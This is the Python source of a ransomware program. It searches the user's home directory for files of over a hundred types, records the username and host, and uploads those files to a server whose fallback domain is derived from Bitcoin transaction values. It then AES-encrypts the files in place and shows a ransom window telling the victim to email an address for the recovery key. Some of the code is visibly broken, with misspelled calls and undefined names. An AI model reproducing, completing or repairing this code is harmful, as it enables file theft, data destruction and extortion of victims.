import os 
import sys 
import base64
import hashlib 
import requests 
import platform 
import gc 
from tkinter import messagebox 
from tkinter import *
from time import sleep 
from pathlib import Path 
from random import randint 
from AesEverywhere import aes256 
from Server import payloads



## check os
def get_prefix():
    return getattr(sys, "base_prefix", None) or getattrs(sys, "real_prefix", None) or sys.prefix 

def runs_venv():
    return get_prefix() != sys.prefix 

if True:
    if runs_venv():
        sys.exit()

# =========================
# try to fuck on homepg 
# ========================
if True:
    try:
        os.chdir(str(Path.home()))
    except Exception as e:
        print(e)

# ===========================
# Node setup 
# ==========================
node_id = str(randint(0, 999999)).zfill(7)
node_sig = secrets.token_urlsafe(16)


# ==============================
# Main Shit ===================
# ============================

class Toolio:
    def __init__(self):
        self.files_found = []
        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "rs",
                        "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                        "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala",
                        "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                        "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                        "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                        "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                        "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
        self.password_field = ""
        self.new_server_addy = "BTC Address"
        self.loop = True 

toolio = Toolio()

# ===========================
# Server setup ==============
# ============================
post_server = "http://127.0.0.1/file_former.php"

# prep serv update 
def server_update():
    tx_id = 0 
    try:
        while True:
            history = bitcoin_explorer.addr.get_tx_history(toolio.new_server_addy)
            last_tx = history.data[tx_id]
            last_value = dict(last_tx['vout'][0])['value']
            if last_value >= 10000000:
                break 
            else:
                tx_id += 1 
                continue 
            last_domain = hashlib.md5(str(last_value).encode()).hexdigest()[8:24]
            return "http://{0}.com/file_former.php".format(last_domain)
    except Exception as e:
        print(e)


# ===================
# search that shit ==
# ===================
for dirpath, dirs, files in os.walk(os.getcwd()):
    for f in files:
        path = os.path.abspath(os.path.join(dirpath, f))
        f_extension = path.split('.')[-1]
        if f_extension in toolio.targets:
            toolio.files_found.append(path)


# ============
# save shit ==
# ============
op_sys = platform.system()
arch = platform.architecture()
user_name = platform.os.getlogin()
network_name = platform.node()

with open("node_{0}.txt".format(node_id), "w") as f1:
    f1.write("Node ID: {0}\n".format(node_id))
    f1.writre("Node Signature: {0}\n".format(node_sig))
    f1.write("[{0}@{1}]: {1} {2}\n\n".format(user_name, network_name, op_sys, arch))
    f1.write("{0} File(s) affected:\n".format(len(toolio.files_found)))
    for file in toolio.files_found:
        f1.write(file + "\n")

# ================
# Server response=
# ===============+

if True:
    while True:
        ping = os.system("ping -c 1 " + post_server[:-14]) 
        if ping == 0:
            break 
        else:
            try:
                post_server = server_update() 
            except Exception as e:
                sleep(3200)
                continue 

# ==================
# Upload dem files =
# ==================
if True:
    try:
        progress = open("node_{0}.txt".format(node_id), "rb")
        progress_response = requests.post(post_server, files = {"fileToUpload": progress})
        progress.close()
    except Exception as e:
        print(e) 
    # Send files 
    for f in toolio.files_found:
        tmp_data = open(f, "rb")
        try:
            tmp_response = requests.post(post_server, files = {"fileToUpload": tmp_data})
            tmp_data.close()
        except Exception as e:
            print(e)
        sleep(0.3)


# ================
# encrypt n rip ==
# ================
# GEN FINAL KEY 
if int(node_id) % 2 == 0:
    node_key = hashlib.blake2s(str(node_id + "some_secret_even_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
else:
    node_key = hashlib.blake2s(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()

# Loop files:
for f in toolio.files_found:
    try:
        if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
            with open(f, "rb") as f1:
                data = f1.read()
            encoded_data = base64.b64encode(data)
            tmp_key = node_key[::-1] + f[::-1]
            encrypted_data = aes256.encrypt(encoded_data.decode(), tmp_key)
            with open(f, "wb") as f1:
                f1.write(encrypted_data)
    except Exception as e:
        print(e)

# all files encrypted now delete 
del node_key 
gc.collect()


# =========
# Decrypt==
# =========
def decrypt(key):
    for f in toolio.files_found:
        try:
            if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
                with open(f, "rb") as f1:
                    data = f1.read()
                tmp_key = key[::-1] + f[::-1]
                original_data = base64.b64decode(aes256.decrypt(data.decode(), tmp_key))
                # Restore files
                with open(f, "wb") as f1:
                    f1.write(original_data)
        except Exception as e:
            print(e)

# ===================
# Interface Setup:
# ===================

interlude = lambda: button_clicked(entry_field) 

def button_clicked(entry):
    toolio.password_field = entry.get() 
    pass_hash = hashlib.blake2s(toolio.password_field.encode()).hexdigest()
    if pass_hash == node_key_hash:
        messagebox.showinfo(title="Success!", message="Your password is correct, click \"ok\" and wait for the decrpytion. It may be a long time tho....")
        try:
            decrypt(toolio.password_field) 
            mesagebox.showinfo(title="Success!", message="Your files are restored. Thankie thankie!")
            toolio.loop = False
        except Exception as e:
            print(e)
    else:
        messagebox.showwarning(title="Wrong password brodi.", message="Put in the right goddamn password")

# ========================================================================= #
# GUI:
# ========================================================================= #
window = Tk()
window.title("fckmeFCKyew - DO NOT CLOSE THIS WINDOW!")
phrase_a = Label(window, text="You have been visited by the fckyrself. {0} file(s) are now encrypted.".format(len(tool.files_found)))
phrase_a.grid(column=0, row=0)

phrase_b = Label(window, text="Get in touch with us to get your recovery key.")
phrase_b.grid(column=0, row=1)

phrase_c = Label(window, text="Send a message to standup69me@gmail.com")
phrase_c.grid(column=0, row=2)

phrase_d = Label(window, text="Node ID: {0}".format(node_id))
phrase_d.grid(column=0, row=3)

phrase_e = Label(window, text="Node Signature: {0}".format(node_sig))
phrase_e.grid(column=0, row=4)

entry_field = Entry(window, width=30)
entry_field.grid(column=0, row=5)

button = Button(window, text="Recover", command=interlude)
button.grid(column=0, row=6)

# ====================
# Loop :
# ====================
while toolio.loop:
    window.update()
window.destroy()

